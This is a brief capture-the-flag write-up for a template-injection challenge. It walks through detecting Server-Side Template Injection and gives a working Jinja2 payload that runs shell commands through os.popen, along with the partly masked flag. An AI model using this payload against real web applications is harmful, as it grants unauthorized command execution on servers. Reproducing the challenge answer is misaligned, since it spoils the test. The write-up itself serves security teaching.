# Description 

I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website `here`!

# Hints

Server Side Template Injection

# Solution 

Server-Side Template Injection (SSTI) is a security vulnerability that allows you to inject malicious code into a web application's template engine. A template engine is responsible for connecting HTML and the UI with the backend.

The fastest way to check for SSTI is by entering: `{{7*7}}`, If the output is 49, the website is likely vulnerable to Server-Side Template Injection.

Now, try executing the following payload:

```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("dir").read() }}
```
```
self._TemplateReference__context → Retrieves the current template context.
.cycler.__init__.__globals__ → Accesses all global variables in Python, including os.
.os.popen("dir") → Opens a shell and executes the "dir" command.
.read() → Reads and displays the command output.
```
This command lists all files and directories in the current location. Pay attention to the directory named "flag"— use cat to read its contents, and you will find the flag.

The flag is: `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99******}`
